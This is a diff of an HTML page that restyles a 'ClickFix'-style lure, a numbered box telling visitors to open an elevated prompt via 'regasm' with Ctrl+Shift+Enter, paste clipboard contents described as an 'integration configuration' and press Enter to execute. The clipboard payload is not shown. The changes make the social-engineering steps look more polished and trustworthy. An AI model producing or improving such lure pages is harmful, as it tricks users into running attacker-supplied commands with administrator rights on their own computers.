@@ -41,21 +41,51 @@
             text-align: left;
         }
         .step {
-            background: #f8f9fa;
-            border: 1px solid #e9ecef;
-            border-radius: 6px;
-            padding: 12px 16px;
-            margin: 8px 0;
+            position: relative;
+            padding: 16px 16px 16px 52px;
+            margin: 10px 0;
             font-size: 14px;
-            color: #495057;
+            color: #1a1f36;
+            background: #f8fbff;
+            border: 1px solid #e6ecf2;
+            border-radius: 10px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
         }
         .step-number {
-            font-weight: 600;
-            color: #007bff;
-            margin-right: 8px;
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 14px;
+            box-shadow: 0 2px 6px rgba(102, 126, 234, 0.35);
         }
         .step-content {
             display: inline;
+        }
+        /* Keycap-style emphasis for shortcuts and important words */
+        .step-content strong {
+            color: #1a1f36;
+            font-weight: 700;
+            background: #eef2ff;
+            border: 1px solid #c7d2fe;
+            padding: 1px 6px;
+            border-radius: 6px;
+            box-shadow: inset 0 -1px 0 rgba(0,0,0,0.06);
+        }
+        .step-content code {
+            background: #eef2ff;
+            border: 1px solid #c7d2fe;
+            padding: 1px 6px;
+            border-radius: 6px;
         }
         .action-btn {
             background: #1A73E8;
@@ -113,6 +143,16 @@
         .step-completed .step-number {
             color: #28a745;
         }
+        /* Special treatment for the first step like ClickFix callout */
+        #step-1 {
+            background: #fff7e6;
+            border-color: #ffe0b2;
+        }
+        #step-1 .step-number {
+            background: linear-gradient(135deg, #ffb84d 0%, #ff8a00 100%);
+            color: #fff;
+            box-shadow: 0 2px 6px rgba(255, 168, 0, 0.35);
+        }
         .back-link {
             position: absolute;
             top: 20px;
@@ -151,27 +191,27 @@
         <div class="step-container" id="stepContainer">
             
             <div class="step" id="step-1">
-                <span class="step-number">1.</span>
+                <span class="step-number">1</span>
                 <span class="step-content"><p>Press <strong>Win</strong> on your keyboard</p></span>
             </div>
             
             <div class="step" id="step-2">
-                <span class="step-number">2.</span>
+                <span class="step-number">2</span>
                 <span class="step-content"><p>Type <strong><code>regasm</code></strong> and press <strong>Ctrl+Shift+Enter</strong></p></span>
             </div>
             
             <div class="step" id="step-3">
-                <span class="step-number">3.</span>
+                <span class="step-number">3</span>
                 <span class="step-content"><p>Click <strong>Yes</strong> when prompted</p></span>
             </div>
             
             <div class="step" id="step-4">
-                <span class="step-number">4.</span>
+                <span class="step-number">4</span>
                 <span class="step-content"><p>Press <strong>Ctrl-V</strong> to paste the integration configuration</p></span>
             </div>
             
             <div class="step" id="step-5">
-                <span class="step-number">5.</span>
+                <span class="step-number">5</span>
                 <span class="step-content"><p>Press <strong>Enter</strong> to execute</p></span>
             </div>
             
